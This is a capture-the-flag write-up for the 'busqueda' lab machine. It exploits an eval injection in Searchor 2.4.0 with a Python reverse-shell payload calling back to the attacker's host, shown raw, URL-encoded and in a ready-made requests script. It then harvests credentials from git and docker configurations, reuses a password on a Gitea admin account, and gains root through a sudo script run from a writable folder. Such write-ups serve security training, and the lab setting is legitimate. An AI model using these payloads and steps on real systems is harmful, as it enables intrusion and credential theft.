# busqueda

| Hostname   | Difficulty |
| ---        | ---        |
| busqueda   | Easy       |

Machine IP: 10.10.10.xx :

```bash
TARGET=10.10.11.208       # busqueda IP address
ATTACKER=10.10.14.17     # attacker IP
```

## Initial Reconnaissance

### Ports and services

```shell
nmap -sC -sV -A $TARGET
```

Result:

```text
Nmap scan report for 10.10.11.208
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/16%OT=22%CT=1%CU=31438%PV=Y%DS=2%DC=T%G=Y%TM=64636B4
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   16.71 ms 10.10.14.1
2   17.22 ms 10.10.11.208

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.06 seconds
```

```shell
echo "$TARGET    searcher.htb" >> /etc/hosts
```

### HTTP service - port 80/TCP

firefox http://searcher.htb/ &

![](assets/searcher_home_1.png)

![](assets/searcher_home_2.png)

We note here the application and its version : Searchor 2.4.0

### Information founds

| port | service | Software/version |
| ---  | ---     | ---              |
| 22   | SSH     | OpenSSH 8.9p1    |
| 80   | HTTP    | Searchor 2.4.0   |

## Initial access

### Exploitation

We can find its home page with google: [https://github.com/ArjunSharda/Searchor](https://github.com/ArjunSharda/Searchor). It's a python library.

We can google for a vulnerability and find :

[https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303](https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303) :

> Arbitrary Code Execution 
> 
> Affected versions of this package are vulnerable to Arbitrary Code Execution due to unsafe implementation of `eval` method.

[https://github.com/xqx12/daily-info/blob/master/tech_info_20230429.md](https://github.com/xqx12/daily-info/blob/master/tech_info_20230429.md) which points to : [https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-)

> Send this as query parameter to the tested host

```
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

This payload is used in engine field with URL encoding:

```
engine=',exec("import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(('10.10.14.17',4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(['/bin/bash','-i'])%3b"))%23&query=test
```

- `%3b` = `;`
- `%3d` = `=`
- `%23` = `#`

We can also use curl to make the query :

```shell
curl -X POST http://searcher.htb/search -d 'engine=Accuweather' -d 'query=test'
```

In order to make all the actions, here is a do-it-all python script :

```python
import requests

url="http://searcher.htb/search"
C2IP = "10.10.14.17"
C2Port = 4444

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

print("--- Simple test to auto-check validity ---")
params = { 'engine' : 'Accuweather',
            'query' : 'test'
             }
r = requests.post(url, data=params, headers=headers)

print(r.content)

print("--- With payload ---")
Payload = """', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{}',{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#""".format(C2IP,C2Port)

print("Payload:")
print(Payload)

params = { 'engine' : 'Accuweather',
            'query' : Payload
             }
r = requests.post(url, data=params, headers=headers)

print(r.content)
```

With the listened on port 4444 :

```
nc -nvlp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.208.
Ncat: Connection from 10.10.11.208:40434.
/bin/sh: 0: can't access tty; job control turned off
$ 
```

we now have a shell on target host

## Post-Exploitation

### Host Reconnaissance

We can start by enumerating current directory:

```shell
$ ls -la
```

Result:

```text
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4096 May 16 11:38 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates
```

There is a `.git` folder that contains credentials :

```shell
$ cat .git/config
```

Result:

```text
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

credentials :

| Username  | Password  | Hash      | Usage     |
| ---       | ---       | ---       | ---       |
| cody      | jh1usoih2bkjaspwe92 | | gitea.searcher.htb |


There could be a hidden gitea named `gitea.searcher.htb`.

We can continue by checking `sudo` access rights:

```shell
sudo -S -l
```

Result:

```text
[sudo] password for svc: jh1usoih2bkjaspwe92
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

This user is able to execute python script as root. Let's check it :

```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
```

Result:

```text
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

We do not have the rights to read the source code located in `/opt/scripts/`.

We can execute only 3 commands :

```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-ps
```

Result:

```text
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 9 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 9 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

There is a container with a gitea instance, and another one with a mysql engine. we can find a reference to it in hosts file :

```shell
cat /etc/hosts
```

Result:

```text
127.0.0.1 localhost
127.0.1.1 busqueda searcher.htb gitea.searcher.htb
```
 
Next commands :

```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
```

Result:

```text
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Result:

```text
Something went wrong
```

We can check docker inspect documentation, as it seems to be related : [https://docs.docker.com/engine/reference/commandline/inspect/](https://docs.docker.com/engine/reference/commandline/inspect/)

The base command is :

```shell
docker inspect --format='{{json .Config}}' $INSTANCE_ID
```

So we can try the following command (960873171e2e: ID of gitea container obtained from `sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-ps` ) :

```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e
```

Result:

```json
{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
```

This is the container configuration. There is a port 22/SSH open, and port 3000 for gitea web interface. We can also note some credentials :

| Username  | Password  | Hash      | Usage     |
| ---       | ---       | ---       | ---       |
| gitea     | yuiu1hoiu4i5ho1uh |   | gitea database user |

And the mysql instance :

```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a6b33fb5a
```

Result:

```json
{"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

Some credentials agains :

| Username  | Password  | Hash      | Usage     |
| ---       | ---       | ---       | ---       |
|           | jI86kGUuj87guWr3RyF | | Mysql root account |

So we have :

credentials :

| Username  | Password  | Hash      | Usage     |
| ---       | ---       | ---       | ---       |
| cody      | jh1usoih2bkjaspwe92 | | gitea.searcher.htb |
| gitea     | yuiu1hoiu4i5ho1uh |   | gitea database user |
|           | jI86kGUuj87guWr3RyF | | Mysql root account |


### explore gitea

We can access this gitea instance with :

```shell
echo "$TARGET    gitea.searcher.htb" >> /etc/hosts
```

firefox http://gitea.searcher.htb/ &

![](assets/gitea.png)

signin with cody user :

| Username  | Password  | Hash      | Usage     |
| ---       | ---       | ---       | ---       |
| cody      | jh1usoih2bkjaspwe92 |           | gitea          |

There is 1 repository :

![](assets/gitea_repos.png)

There are 2 users :

![](assets/gitea_users.png)

There is an account named "administrator", and he seems to have activity on this gitea.

With the username "administrator", we can try to reuse all the known passwords. One is working, reused from mysql root account:

credentials :

| Username  | Password  | Hash      | Usage     |
| ---       | ---       | ---       | ---       |
| administrator | yuiu1hoiu4i5ho1uh |           | gitea |

![](assets/gitea_admin.png)

There is a new repository available : administrator / scripts

This repository contains the sources of scripts comming with `/opt/scripts/system-checkup.py` we used with `sudo` :

```shell
ls -la /opt/scripts/
```

Result:

```text
total 28
drwxr-xr-x 3 root root 4096 Dec 24 18:23 .
drwxr-xr-x 4 root root 4096 Mar  1 10:46 ..
-rwx--x--x 1 root root  586 Dec 24 21:23 check-ports.py
-rwx--x--x 1 root root  857 Dec 24 21:23 full-checkup.sh
drwxr-x--- 8 root root 4096 Apr  3 15:04 .git
-rwx--x--x 1 root root 3346 Dec 24 21:23 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24 21:23 system-checkup.py
```

In the script `scripts/system-checkup.py` we can notice :

```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

So it will execute `./full-checkup.sh` without control on working directory.

This mean we can execute a script named `./full-checkup.sh` in a current folder if we have write access.

### Privilege Escalation

Let's create a file `/tmp/full-checkup.sh` that containing a payload to set SUID bit on bash:

```shell
cd /home/svc
echo "#!/bin/bash\nchmod +s /bin/bash" > ./full-checkup.sh
chmod +x ./full-checkup.sh
ls -la ./full-checkup.sh
ls -la /bin/bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
ls -la /bin/bash
```

Result:

```text
-rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
[+] Done!
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

we can now have a root shell :

```shell
/bin/bash -p
id
```

Result:

```text
uid=1000(svc) gid=1000(svc) euid=0(root) egid=0(root) groups=0(root)
```

## Loots

### credentials

| Username  | Password  | Hash      | Usage     |
| ---       | ---       | ---       | ---       |
| cody      | jh1usoih2bkjaspwe92 | | gitea.searcher.htb |
| gitea     | yuiu1hoiu4i5ho1uh |   | gitea database user |
|           | jI86kGUuj87guWr3RyF | | Mysql root account |
| administrator | yuiu1hoiu4i5ho1uh |           | gitea |
